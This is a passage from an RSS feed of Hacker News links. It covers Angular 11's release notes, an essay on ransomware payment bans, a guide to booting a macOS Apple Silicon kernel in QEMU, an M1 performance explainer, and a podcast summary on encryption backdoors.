local server starts the console will display a message confirming that HMR is active:</p><p id="f521">NOTICE: Hot Module Replacement (HMR) is enabled for the dev server.</p><p id="5155">See <a href="https://webpack.js.org/guides/hot-module-replacement" rel="noopener">https://webpack.js.org/guides/hot-module-replacement</a> for information on working with HMR for webpack.</p><p id="3796">Now during development the latest changes to components, templates and styles will be instantly updated into the running application. All without requiring a full page refresh. Data typed into forms are preserved as well as scroll position providing a boost to developer productivity.</p><h2 id="6de3">Faster Builds</h2><p id="630c">We’re bringing a faster development and build cycle by making updates to some key areas.</p><ul><li id="4336">When installing dependencies, the ngcc update process is now 2–4x faster.</li><li id="b30d">Faster compilation with TypeScript v4.0.</li></ul><p id="ed18">Now, teams can opt-in to webpack v5. Currently, you could experiment with <a href="https://webpack.js.org/concepts/module-federation/" rel="noopener">module federation</a>. In the future, webpack v5 will clear the path for:</p><ul><li id="db89">Faster builds with persistent disk caching</li><li id="7ab4">Smaller bundles thanks to <a href="https://webpack.js.org/guides/tree-shaking/" rel="noopener">cjs tree-shaking</a></li></ul><p id="dae8">Support is experimental and under development so we don’t recommend opting in for production uses.</p><p id="4ca8">Want to try out webpack 5? To enable it in your project, add the following section to your package.json file:</p><pre><span id="386c">"resolutions": {<br>     "webpack": "5.4.0"<br>}</span></pre><p id="65a0">Currently, you’ll need to use <strong>yarn</strong> to test this as npm does not yet support the resolutions property.</p><h2 id="d0a9">Linting</h2><p id="e4b2">In previous versions of Angular, we’ve shipped a default implementation for linting (TSLint). Now, TSLint is deprecated by the project creators who recommend migration to ESLint. <a href="https://twitter.com/mrjameshenry" rel="noopener">James Henry</a> together with other folks from the open-source community developed a third-party solution and migration path via <a href="https://github.com/typescript-eslint/typescript-eslint" rel="noopener">typescript-eslint</a>, <a href="https://github.com/angular-eslint/angular-eslint" rel="noopener">angular-eslint</a> and <a href="https://github.com/typescript-eslint/tslint-to-eslint-config" rel="noopener">tslint-to-eslint-config</a>! We’ve been collaborating closely to ensure a smooth transition of Angular developers to the supported linting stack.</p><p id="6071">We’re deprecating the use of TSLint and Codelyzer in version 11. This means that in future versions the default implementation for linting Angular projects will not be available.</p><p id="806d">Head over to the <a href="https://github.com/angular-eslint/angular-eslint#migrating-from-codelyzer-and-tslint" rel="noopener">official project page</a> for a guide to incorporate angular-eslint in a project and migrate from TSLint.</p><h2 id="98a6">Housekeeping</h2><p id="0727">In this update we’re removing support for IE9/IE10 and IE mobile. IE11 is the only version of IE <a href="https://angular.io/guide/browser-support" rel="noopener">still supported</a> by Angular. We’ve also <a href="https://angular.io/guide/deprecations" rel="noopener">removed deprecated APIs</a> and added a few to the deprecation list. Be sure to check this out to make sure you are using the latest APIs and following our recommended best practices.</p><h2 id="a3c7">Roadmap</h2><p id="9aad">We’ve also updated the <a href="https://angular.io/guide/roadmap" rel="noopener">roadmap</a> to keep you posted on our current priorities. Some of the announcements in this post are updates on in-progress projects from the roadmap. This reflects our approach to incrementally rollout larger efforts and allows developers to provide early feedback that we can incorporate it into the final release.</p><p id="8c07">We collaborated with <a href="https://twitter.com/simpulton" rel="noopener">Lukas Ruebbelke</a> from the Angular community on updating the content of some of the projects to better reflect the value they provide to developers.</p><h2 id="6939">How to update to get version 11</h2><p id="0170">When you are ready to go run this command to update Angular and CLI:</p><pre><span id="5983">ng update @angular/cli @angular/core</span></pre><p id="ac5f">Head over to <a href="https://update.angular.io/" rel="noopener">update.angular.io</a> to find detailed information and guidance on updating. We always recommend upgrading one major release at a time to have the best update experience.</p><p id="732f">We hope you enjoy this feature update and be sure to let us know what you think here or on <a href="https://twitter.com/angular" rel="noopener">Twitter</a>!</p></div></div></section></div></div>]]>
            </description>
            <link>https://blog.angular.io/version-11-of-angular-now-available-74721b7952f7</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065091</guid>
            <pubDate>Thu, 12 Nov 2020 01:06:18 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Ransomware Prohibition]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25065057">thread link</a>) | @SCHiM
<br/>
November 11, 2020 | https://gru.gq/2020/10/18/ransomware-prohibition/ | <a href="https://web.archive.org/web/*/https://gru.gq/2020/10/18/ransomware-prohibition/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><main><article itemscope="" itemtype="https://schema.org/CreativeWork"><div itemprop="text"><h2>Theres nothing that can’t be made worse</h2>
<p><a href="https://home.treasury.gov/policy-issues/financial-sanctions/recent-actions/20201001">The Treasury has moved to prohibit payment of ransomware ransoms</a>. They’ve said there will be some exceptions, and it is obvious that this won’t be an effective complete global ban on payment. The result, a partial ban on payment, is the worst possible ransomware environment for victims. The impact of different legal regimes governing ransom payments are well documented and understood, <a href="https://rusi.org/publication/occasional-papers/closing-gap-assessing-responses-terrorist-related-kidnap-ransom">see RUSI here</a>.</p>
<p>Banning ransomware payments seems like a means of removing the financial reward for the gangs. It makes intuitive sense that if the victims cannot pay, then the gangs will stop using ransomware. Unfortunately the counterintuitive truth is that an incomplete, ineffective, partial ban will actually make objectively ransomware worse for everyone.</p>
<p>If there is a complete universal global ban, then ransomware ceases to be a source of money and the ransomware gangs stop. Or at least migrate to something else that makes money. We know this scenario is not going to happen.</p>
<h3>What’s the worst that can happen?</h3>
<p>A partial ban creates significant unintended consequences. Firstly, the ransomware gangs still make money from ransomware, so they do <strong>not</strong> cease operations. Then, to encourage payment they become more drastic and extreme in their actions. They have to make a stronger incentive to encourage people who are dissuaded by the ban, but might pay if given sufficient “encouragement”. Then, because the prohibition on payment drives it underground – with all the limited transparency and brutal mechanisms for enforcing compliance — the ransom prices rise. This environment: higher prices, more aggressive ransomware gangs, fewer reputable companies negotiating and handling the ransom payments (and thereby managing the gangs); it is the worst possible situation for everyone.</p>
<h3>How to control attacker behaviour</h3>
<p>The only entity with power to control the behaviour of ransomware gangs is the one providing their protection. The gangs need a place to operate and somewhere to convert their crypto currency into hard currency. They are cashing out hundreds of thousands of dollars in crypto, and there is no way that isn’t raising “know your customer” alerts for money laundering.</p>
<p>The only controlling entity is the one that allows the gangs to operate. The gangs are completely at the mercy of whichever entity provides protection (yes, it’s Russia). This is the rule everywhere that kidnapping gangs operate, and ransomware gangs share this trait with kidnap&amp;ransom (K&amp;R) gangs with regards to their operational requirements.</p>
<h3>Private governance. Better than nothing? Hmm</h3>
<p>The current situation, where there is no criminalisation of payment has created a market place where a number of companies working with insurers are handling the vast majority of ransomware incidents. There are crisis responders who help the companies recover, who arrange a minimal payment, and who get paid by the insurers. This is market governance and it keeps the prices down because there is a sort of gentlemen’s agreement between the gangs and the payment companies. Also, the lack of prohibition means these companies operate in the open and they can share information about pricing etc internally and with each other. (Transparency)</p>
<p>The status quo is not the ideal world, but it is far better than the nightmare of ineffective partial prohibition.</p>
<div><p>Liked it? Take a second to support grugq on Patreon!</p><p><a rel="nofollow" target="_blank" href="https://www.patreon.com/oauth2/become-patron?response_type=code&amp;min_cents=100&amp;client_id=XPz53m5BPTmu-cnihK1RXoEaRoNywCco8VIPCNbwnAexV5YWdi_YG5Asup2LeG9p&amp;scope=identity%20identity[email]&amp;redirect_uri=https://gru.gq/patreon-authorization/&amp;state=eyJmaW5hbF9yZWRpcmVjdF91cmkiOiJodHRwczpcL1wvZ3J1LmdxXC8yMDIwXC8xMFwvMThcL3JhbnNvbXdhcmUtcHJvaGliaXRpb25cLyJ9&amp;utm_source=https%3A%2F%2Fgru.gq%2F2020%2F10%2F18%2Fransomware-prohibition%2F&amp;utm_medium=patreon_wordpress_plugin&amp;utm_campaign=457796&amp;utm_term=&amp;utm_content=post_unlock_button"><img src="https://i2.wp.com/gru.gq/wp-content/plugins/patron-button-and-widgets-by-codebard/images/become_a_patron_button.png?ssl=1" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/gru.gq/wp-content/plugins/patron-button-and-widgets-by-codebard/images/become_a_patron_button.png?ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p></div>
<!--<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://gru.gq/2020/10/18/ransomware-prohibition/"
    dc:identifier="https://gru.gq/2020/10/18/ransomware-prohibition/"
    dc:title="Ransomware Prohibition"
    trackback:ping="https://gru.gq/2020/10/18/ransomware-prohibition/trackback/" />
</rdf:RDF>-->
</div></article>
		

		
		

		</main></div></div></div></div>]]>
            </description>
            <link>https://gru.gq/2020/10/18/ransomware-prohibition/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25065057</guid>
            <pubDate>Thu, 12 Nov 2020 01:01:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MacBook Air in Pure CSS]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064721">thread link</a>) | @ent101
<br/>
November 11, 2020 | https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css | <a href="https://web.archive.org/web/*/https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><nav role="navigation"><div><div><form action="/search" method="get"></form><p><img src="https://opimg.s3.amazonaws.com/e47219f7aa-200x200.jpg" id="app-toolbar-icon"></p><div id="app-options-wrapper"><div><div><p data-toggle="modal" data-target="#review-modal" id="reviews-modal-link" title="View reviews or write one"><span></span> <span>7</span></p></div></div></div></div><div id="navbar-user-items" aria-expanded="false"><p><a href="https://www.outpan.com/signup">Sign Up</a></p><ul><li></li></ul><ul><li><a href="https://www.outpan.com/">Home</a></li><li><a href="https://www.outpan.com/login?ref=https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css">Login</a></li><li><a href="https://www.outpan.com/signup">Sign Up</a></li></ul><form action="/search" method="get"></form></div></div></nav><div><div><div><div></div></div></div></div></div>]]>
            </description>
            <link>https://www.outpan.com/app/e47219f7aa/macbook-air-in-pure-css</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064721</guid>
            <pubDate>Thu, 12 Nov 2020 00:24:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Booting a macOS Apple Silicon Kernel in QEMU]]>
            </title>
            <description>
<![CDATA[
Score 254 | Comments 70 (<a href="https://news.ycombinator.com/item?id=25064593">thread link</a>) | @empyrical
<br/>
November 11, 2020 | https://worthdoingbadly.com/xnuqemu3/ | <a href="https://web.archive.org/web/*/https://worthdoingbadly.com/xnuqemu3/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I booted the arm64e kernel of macOS 11.0.1 beta 1 kernel in QEMU up to launchd. It’s completely useless, but may be interesting if you’re wondering how an Apple Silicon Mac will boot.</p>

<h2 id="howto">Howto</h2>

<p>This is similar to my previous guide on running <a href="https://worthdoingbadly.com/xnuqemu2/">iOS kernel in QEMU</a>:</p>

<ul>
  <li>install macOS 11.0.1 beta 1 (20B5012D)</li>
  <li>run <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/build_arm64e_kcache.sh"><code>build_arm64e_kcache.sh</code></a> to create an Apple Silicon Boot Kext Collection</li>
  <li>build the modified QEMU:
    <div><div><pre><code>git clone https://github.com/zhuowei/qemu
cd qemu
git checkout a12z-macos
mkdir build
cd build
../configure --target-list=aarch64-softmmu
make
</code></pre></div>    </div>
  </li>
  <li>create a modified device tree by running <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/FourthTry/DTRewriter.java">DTRewriter</a> on <a href="https://updates.cdn-apple.com/2020SummerSeed/fullrestores/001-30235/6D8C0CA3-5952-4FD8-AEB3-4B4CADB626BC/iPad8,11,iPad8,12_14.0_18A5332f_Restore.ipsw">iPad Pro firmware</a>:
    <div><div><pre><code>python3 extractfilefromim4p.py Firmware/all_flash/DeviceTree.j421ap.im4p DeviceTree_iPad_Pro_iOS_14.0_b3.devicetree
java DTRewriter DeviceTree_iPad_Pro_iOS_14.0_b3.devicetree DeviceTree_iPad_Pro_iOS_14.0_b3_Modified.dtb
</code></pre></div>    </div>
  </li>
  <li>run QEMU:
    <div><div><pre><code>./aarch64-softmmu/qemu-system-aarch64 -M virt -cpu max \
  -kernel /path/to/bootcache-arm64e \
  -dtb /path/to/DeviceTree_iPad_Pro_iOS_14.0_b3_Modified.dtb  \
  -monitor stdio -m 6G -s -S -d unimp,mmu \
  -serial file:/dev/stdout -serial file:/dev/stdout -serial file:/dev/stdout \
  -append "-noprogress cs_enforcement_disable=1 amfi_get_out_of_my_way=1 nvram-log=1 debug=0x8 kextlog=0xffff io=0xfff serial=0x7 cpus=1 rd=md0 apcie=0xffffffff" \
  -initrd /path/to/ios14.0b3/ramdisk.dmg $@
</code></pre></div>    </div>
  </li>
  <li>run gdb with <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/bootit.gdbscript">this script</a>:
    <div><div><pre><code>~/Library/Android/sdk/ndk/21.0.6113669/prebuilt/darwin-x86_64/bin/gdb \
-D /any/emptydir \
-x bootit.gdbscript
</code></pre></div>    </div>
    
  </li>
</ul>

<p>And the macOS kernel will <a href="https://gist.github.com/zhuowei/5aa668e76f387374cd56848313aa2197">boot into launchd</a>.</p>

<h2 id="is-this-useful">Is this useful?</h2>

<p><img src="https://worthdoingbadly.com/assets/blog/xnuqemu3/wwdc2018_no.jpg" alt="&quot;No.&quot; - Craig Federighi, WWDC 2018"></p>

<p>No:</p>

<ul>
  <li>Absolutely nothing is supported: literally only the kernel and the serial port works, not even the userspace since there’s no disk driver</li>
  <li>Userspace is instead borrowed from iOS 14 b3</li>
  <li>This will never boot anything close to graphical macOS UI</li>
  <li>Most importantly, even if I ever managed to fully boot the macOS kernel, emulating macOS is useless anyways.</li>
</ul>

<p>There are only three reasons I can think of for emulating macOS: security research, software development without a real Apple Silicon machine, and Hackintoshing. This approach will help with none of these:</p>

<ul>
  <li>Emulating iOS is useful for security research when jailbreak is not available. Apple Silicon Macs already support kernel debugging.</li>
  <li>Not useful for software dev: QEMU’s CPU emulation doesn’t support Apple Silicon-specific features, such as Rosetta’s memory ordering or the APRR JIT.</li>
  <li>as for Hackintosh: macOS uses CPU instructions that aren’t available yet on non-Apple ARM CPUs, so you can’t have hardware accelerated virtualization, only very slow emulation. Besides, Hackintoshes are often built when Apple’s own hardware isn’t fast enough; in this case, Apple’s ARM processors are already some of the fastest in the industry.</li>
</ul>

<p>I researched this this not because it’ll be practical, but only to understand how an Apple Silicon Mac works. This will never be a <a href="https://www.youtube.com/watch?v=1AtE54HpXBM">Time Train</a>: only a <a href="https://youtu.be/UswpJh6Zvd8?t=119">science experiment</a>.</p>

<h2 id="what-i-did">What I did</h2>

<h2 id="create-kext-collection">Create kext collection</h2>

<p>On iOS, the kernel and its Kexts are packed together into a bootable file called the <strong>Kernel Cache</strong>.</p>

<p>macOS 11 uses an evolved version of this format, called the <strong>Boot Kext Collection</strong>.</p>

<p>Like the iOS kernelcache, it contains all Kexts required for booting, so the bootloader only needs to load it into memory and jump into it.</p>

<p>To create a boot kext collection, macOS 11 introduces the <a href="https://developer.apple.com/documentation/kernel/installing_a_custom_kernel_extension?language=objc"><code>kmutil</code></a> tool.</p>

<p>Here’s <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/build_arm64e_kcache.sh">my script</a> to get <code>kmutil</code> to generate an arm64e kext collection.</p>

<p>It manually excludes some kexts because they cause kmutil to error out. Most are because they depend on ACPI, which is not available on Apple Silicon. I made a <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/printexcludekexts.sh">script</a> to detect them.</p>

<p>Debugging <code>kmutil</code> failures on macOS 11 beta 3 was easy because it dumped out the entire NSError message. However, on macOS 11.0.1 beta, Apple decided to hide the full error message and only print an error code. I had to disable SIP and put a breakpoint on <code>swift_errorRetain</code> to get at the underlying error.</p>

<p>Once the <code>build_arm64e_kcache.sh</code> runs, a Boot Kext Collection is created at <code>~/kcache_out/bootcache-arm64e</code>, which can be booted in QEMU.</p>

<h2 id="disassembling-the-boot-kext-collection">Disassembling the boot kext collection</h2>

<p>For debugging, I also had to disassemble the newly created Boot Kext Collection in Ghidra.</p>

<p>Unfortunately, Ghidra isn’t updated for macOS 11 and will refuse to load the file, first giving an error about XML DOCTYPE, then - once that’s worked around - an <a href="https://github.com/NationalSecurityAgency/ghidra/issues/2192">IOException</a> from the invalid <code>ntools</code> value in the <code>LC_BUILD_VERSION</code> load command.</p>

<p>I created a <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/macos11/patch_boot_kext_collection_for_ghidra.py">script</a> to fix up the kext collection so that Ghidra can load it.</p>

<p>Note that this is still not perfect - Ghidra still doesn’t fixup pointers or read symbols.</p>

<p>To get method names, I also disassembled the raw kernel file (<code>/System/Library/Kernels/kernel.release.t8020</code>) for cross reference. Note that the raw kernel is based at a different address - you can either rebase it in Ghidra, or just be careful to convert addresses.</p>

<h2 id="disable-pac">Disable PAC</h2>

<p>I already had a <a href="https://worthdoingbadly.com/xnuqemu2/">modified QEMU to boot an iOS kernel</a> (which has inspired others, such as <a href="https://alephsecurity.com/">Aleph Security</a>, to build much better open-source iOS emulation platforms)</p>

<p>In early 2019 I updated my modified QEMU to work with PAC for the iPhone Xs/Xr.</p>

<p>QEMU by that time already supported PAC instructions; however, Apple <a href="https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html">modified</a> the crypto algorithm when implementing PAC, so the kernel fails to boot.</p>

<p>I decided to instead <a href="https://github.com/zhuowei/qemu/commit/16613b67ad15a902791109077ebfb1091f1873aa">turn PAC instructions</a> into no-ops, since I don’t know how Apple’s algorithm worked. This also makes it easier to debug the kernel.</p>

<p>Since the macOS DTK used an A12z processor, the modified QEMU just worked.</p>

<h2 id="device-tree">Device tree</h2>

<p>Like iOS, macOS on Apple Silicon uses a <strong>device tree</strong> to describe hardware to the kernel, and to pass boot arguments.</p>

<p>macOS 11.0.1 beta’s installer doesn’t contain a device tree for the DTK: I suspect it would be in the .ipsw files, which are not publically available. Instead, I borrowed the iPad Pro’s device tree from iOS 14 beta 3.</p>

<p>Like the <a href="https://worthdoingbadly.com/xnuqemu2/">iOS in QEMU experiments</a>, I first disabled every piece of hardware in the device tree except the serial port.</p>

<p>Unlike iOS, macOS expects some more information in the device tree:</p>
<ul>
  <li>ram size (since Macs have upgradeable RAM)</li>
  <li>nvram, otherwise panics with a null pointer while reading nonce-seed. (I copied nvram from <a href="https://gist.github.com/bazad/1faef1a6fe396b820a43170b43e38be1">bazad’s dump of an iPhone device tree</a>.)</li>
  <li>AMCC (KTRR) register positions</li>
  <li>System Integrity Protection status</li>
</ul>

<p>I rewrote my <a href="https://github.com/zhuowei/XNUQEMUScripts/blob/macos1101b1/FourthTry/DTRewriter.java">device tree editor</a> to allow populating these extra params.</p>

<h2 id="up-to-launchd">Up to launchd</h2>

<p>I can’t actually boot a macOS root filesystem as I don’t have an emulated hard disk.</p>

<p>I don’t have a recovery ramdisk either: that would likely only be included in the DTK IPSW, which is not public.</p>

<p>Instead, I decided to boot with an iOS ramdisk to test the kernel, and disable signature checking using a GDB breakpoint.</p>

<p>I also couldn’t get the trustcache (list of executables trusted by the kernel) to load. I tried following <a href="https://alephsecurity.com/2019/06/25/xnu-qemu-arm64-2/">Aleph Security’s guide</a>, but macOS 11 is more strict than iOS 12 and needs it below the kernel; I couldn’t figure out the correct memory address.</p>

<h2 id="why-it-took-so-long">Why it took so long</h2>

<p>I actually had this blog post ready since <a href="https://gist.github.com/zhuowei/27816d39f234468cf2956479c0dea7ad">August 9th</a>, but I spent an extra 3 months trying to fix issues, since I really wanted to at least get to a shell!</p>

<p>Unfortunately:</p>
<ul>
  <li>debugging why drivers wasn’t loading was hard</li>
  <li>I couldn’t disable signature checking properly</li>
  <li>I wanted to wait until Apple released an A14 kernel instead of the DTK’s A12, so that we can look at how virtualization works, but they never did</li>
</ul>

<p>It’s now November 9th and Apple’s holding their press conference tomorrow: so it’s <a href="https://www.youtube.com/watch?v=9tAbhrDUrqM">now or never</a>.</p>

<h2 id="whats-left">What’s left</h2>

<p>I’m probably not going to be working further on this, but here’s what one can do to make this an actual useful research platform:</p>

<ul>
  <li>Figure out why half the drivers aren’t loading at all</li>
  <li>Write basic drivers/emulations:
    <ul>
      <li>probably emulate AIC in QEMU (based on Project Sandcastle’s Linux driver) since a custom interrupt controller Kext would be hard to write</li>
      <li>port Apple’s old <a href="https://opensource.apple.com/source/AppleMacRiscPCI/AppleMacRiscPCI-3.4/AppleMacRiscPCI.cpp.auto.html">PowerPC PCIE</a> drivers, since it’s too hard to emulate the Apple Silicon PCIE controller. This will allow us to connect a virtual hard drive.</li>
    </ul>
  </li>
  <li>Switch to the A14 kernel when Apple releases Apple Silicon Macs, so we can test virtualization</li>
</ul>

<h2 id="what-i-learned">What I learned</h2>

<ul>
  <li>How to modify QEMU to disable PAC</li>
  <li>How iBoot on Apple Silicon passes boot options in the device tree</li>
  <li>How to generate an Apple Silicon kernel cache without an Apple Silicon Mac</li>
  <li>How to fight <code>kmutil</code> for the real error message</li>
  <li>Never procrastinate on a blog post for three months</li>
</ul>

  </div>
</article>

      </div>
      
    </div></div>]]>
            </description>
            <link>https://worthdoingbadly.com/xnuqemu3/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064593</guid>
            <pubDate>Thu, 12 Nov 2020 00:09:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overlooked source of Apple M1 performance]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064570">thread link</a>) | @kwiromeo
<br/>
November 11, 2020 | https://kwiromeo.com/explaining-apple-m1-products-performance/ | <a href="https://web.archive.org/web/*/https://kwiromeo.com/explaining-apple-m1-products-performance/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            


            <section>
                <div>
                    <p>When watching <a href="https://youtu.be/5AwdkGKmZ0I">Apple's Arm laptops</a> event, I couldn't help but wonder: where is all that performance coming from? During the event, there were two key points (that are not obvious, IMHO), that further explain where they are getting all that extra performance from.</p><p>But first, let's mention the obvious stuff, that plenty of analysts will anchor on, and that are valid:</p><ul><li><strong>More transistors is better</strong>: 5nm process allows more transistors in a chip. More transistors = more instructions processed = faster performance</li><li><strong>Small means low power consumption:</strong> 5nm process allows for lower power consumption. This is because, at that size, the transistor can operate between 0.7V - 1.2V per transistor[<a href="https://www.anandtech.com/show/15219/early-tsmc-5nm-test-chip-yields-80-hvm-coming-in-h1-2020">1</a>] (instead of 1V - 1.35V)[<a href="https://www.anandtech.com/show/16107/what-products-use-intel-10nm-superfin-demystified">2</a>]. At the numbers of billions of transistors, a small voltage difference means a lot for battery consumption.</li><li><strong>Specialized hardware gives an edge</strong>: Accelerators (like the neural engine) allow the Mac to offload specific tasks to another core, which leaves the main processor, M1 to do the work that is less specific (like compiling your code from XCode 😉 )</li></ul><h2 id="unified-memory-architecture-or-making-friends-with-physics-">Unified Memory Architecture (or Making Friends with Physics)</h2><p>When I was transitions careers to become a software developer, I came across this post about latency numbers of common computer components ( a link at <a href="http://norvig.com/21-days.html#answers">Peter Norvig post about it</a>), it occurred to me that all these numbers were proportional to the distance between the CPU and the location of the data. The further the electrons need to travel, the more time they will take. This is a massive oversimplification but illustrates the point well. There are other details to take into account as well. &nbsp;The one that comes to mind is that having the electrical signal only traveling though the SoC instead of the printed circuit board, avoid a lot of signal conditioning that would need to happen to keep signal integrity. Apple brought all their chips closer, which reduced the amount of travel time for every critical signal, as well as reduced the number of medium transitions (from an integrated circuit to a printed circuit board, back to an integrated circuit) as shown in the figure below. This results in higher data access speed by the CPU and the GPU, which translates to a faster experience for the end-user.</p><figure><img src="https://kwiromeo.com/content/images/2020/11/apple_m1_soc_vs_logic_board.jpg" alt="sketch of a logic board with separate chips compared to an apple M1 SoC"><figcaption>Showing the reduced distance of signal traveling for a logic board vs. a SoC :-)&nbsp;</figcaption></figure><h2 id="avoid-unnecessary-copies-or-the-gospel-by-a-c-performance-engineer-">Avoid Unnecessary Copies (or the gospel by a C++ performance engineer)</h2><p>In my year of learning and using C++, I've learned that (unnecessary) copies are bad, and Craig Federighi also knows this. During the presentation, he says</p><blockquote>"We built macOS on Apple Silicon to use the same data formats for things like video decode, GPU and display, so there's no need for expensive copying or translation"</blockquote><p>Why are copies they bad? This has to do with what happens when an object is copied. Here's a simple way to look at the process. Whenever a program issues a copy command, then the CPU needs to:</p><ul><li>read the memory location of the data,</li><li>then reserve memory where the data will be copied</li><li>then copy the data</li><li>then decide what to do with the original data</li></ul><p>When the source of the data copied remains, then the CPU is done. However, when the source data needs to be deleted, then there's the additional step of de-allocating memory space so that other instructions can use it. This problem is sometimes caught by the compiler, whenever possible, and performs an optimization called <a href="https://en.wikipedia.org/wiki/Copy_elision">copy elision</a> whenever it is obvious that a copy is unnecessary. However, while <a href="https://youtu.be/bSkpMdDe4g4">compilers are awesome</a>, they can't undo a programmer's lack of optimization knowledge. One solution that the C++ community found useful, is that we can help the compiler by specifying when copies are not needed. Since C++ 14, programmers can also tell the compilers that we don't need to go through a deep copy, instead, use a command <code>std::move</code>, which does the magic of not destroying and recreate the same thing. This saves CPU cycles, and improves performance.</p><p>From the Apple M1 MacBook presentation, Apple makes the above behavior default: <strong>instead of having the programmer choose between copying or reusing data, reuse of the data is the default</strong>. This makes the efficient behavior to be the default, and save programs from being slowed down by unnecessary copies</p><h2 id="things-i-may-have-missed-and-things-i-don-t-know-about-">Things I May Have Missed (and Things I Don't Know About)</h2><p>The above is a simplified view of the programming model of Apple's new M1 chip. By not having programmed for one, the above is my best guess at how the items noted in the keynote mentions would translate in hardware and software. It's possible that Apple simplified the programming paradigm of CPU vs GPU programming by obfuscating calls to GPU instructions in the macOS APIs. If all the hardware is one the same chip, the programmer doesn't need to know what sub-chip (CPU, GPU, Neural Engine, etc...) is doing the job, but just that the chip (M1) is doing it. From there, the job is for compiler optimization to take over, and make the best decision as to which sub-chip needs to process the instruction.</p><p>—</p><p>PS: if someone who knows the nitty gritty details of this, hit me up <a href="https://twitter.com/kwiromeo">@kwiromeo</a> on twitter. I would love to learn more about this.</p><hr><p>[1] AnandTech - <a href="https://www.anandtech.com/show/15219/early-tsmc-5nm-test-chip-yields-80-hvm-coming-in-h1-2020">Early TSMC 5nm Test Chip Yields 80%, HVM Coming in H1 2020</a></p><p>[2] AnandTech - <a href="https://www.anandtech.com/show/16107/what-products-use-intel-10nm-superfin-demystified">What Products Use Intel 10nm? SuperFin and 10++ Demystified</a></p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://kwiromeo.com/explaining-apple-m1-products-performance/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064570</guid>
            <pubDate>Thu, 12 Nov 2020 00:06:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Government Mandated Backdoors – Security Explained]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064542">thread link</a>) | @sec-explained
<br/>
November 11, 2020 | http://securityexplained.fm/1245467/6099736-government-mandated-backdoors | <a href="https://web.archive.org/web/*/http://securityexplained.fm/1245467/6099736-government-mandated-backdoors">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
      <p>Security Explained</p>
      <p>Government Mandated Backdoors</p>
      <p><span>Nov 11, 2020</span>
        <span>Season 1</span>
        <span>Episode 6</span>
      </p>
      <p>Chris Grayson, Drew Porter, Logan Lamb</p>
      <div>
        <div><p>The Department of Justice has recently released a new memo entitled "International Statement: End-To-End Encryption and Public Safety," and while it says a lot about helping trafficked kids and combating other crime, the memo outlines proposals that will do nothing of the sort. In this episode we discuss the content of this memo and the eerily similar-sounding EARN IT act, pick apart which parts of both are valid and which aren't, and talk about the real motivations behind these documents. We cover the current processes for gaining lawful access to data and how these new proposals don't amount to any true improvement upon existing capabilities.</p><p>As has been the standard theme for the past two decades, American privacy is under attack. These new positions reflect a stark step in the wrong direction if you care to preserve human privacy.</p></div>
      </div>
    </div>
  </div></div>]]>
            </description>
            <link>http://securityexplained.fm/1245467/6099736-government-mandated-backdoors</link>
            <guid isPermaLink="false">hacker-news-small-sites-25064542</guid>
            <pubDate>Thu, 12 Nov 2020 00:00:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Running Python on .NET 5]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25064143">thread link</a>) | @eatox
<br/>
November 11, 2020 | https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html | <a href="https://web.archive.org/web/*/https://tonybaloney.github.io/posts/running-python-on-dotnet-5-with-pyjion.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
                <p><em>This post is an update on the Pyjion project to plug the .NET 5 CLR JIT compiler into Python 3.9.</em></p>
<p>.NET 5 was released on November 10, 2020. It is the cross-platform and open-source replacement of the <a href="https://github.com/dotnet/core"><strong>.NET Core</strong></a> project and the <strong>.NET</strong> project that ran exclusively on Windows since the late 90’s.</p>
<p>.NET is formed of many components:</p>
<ul>
